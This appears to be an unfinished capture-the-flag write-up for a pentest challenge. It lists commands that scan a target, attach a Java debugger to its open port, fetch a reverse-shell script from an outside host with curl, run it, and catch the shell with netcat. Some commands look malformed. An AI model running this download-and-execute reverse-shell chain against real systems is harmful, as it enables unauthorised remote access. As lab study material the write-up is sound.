# Leet Computer: Pentest 19

### One of the attacker is still in the airport hall, and it seems that he is still connected to the airport wifi ! Get a root shell on its machine to continue your investigation. This challenge will give you access to another network.

Still working on it... just dropping commands

1. ```nmap -Pn 10.40.3.230``` This is the ip that pinged us on the Discovery challenge.
   ```port 22 open ssh```
   ```port 8100 open http```
2. ```whatweb 10.40.3.230/8100``` Running Apache & PHP
3. ```telnet 10.40.3.230 8100``` Allows connection
4. *Install jdb*
5. ```jdb attach 10.40.3.230:8100```
6. ```stop in org.apache.logging.log4j.core.config.ConfigurationFileWatcher.isModified```
7. ```print new java.lang.Runtime().exec("sh -c $@|sh . curl 172.16.72.203:8888/reverse.py  -o /tmp/reverse.py")```
8. *Setup Netcat listener*
   ```nc -l 10.40.3.230```
9. ```print new java.lang.Runtime().exec("python3 /tmp/reverse.py")```

<details>
  <summary>SPOILER: Flag</summary>

  ```Haven't Solved```
  
</details>
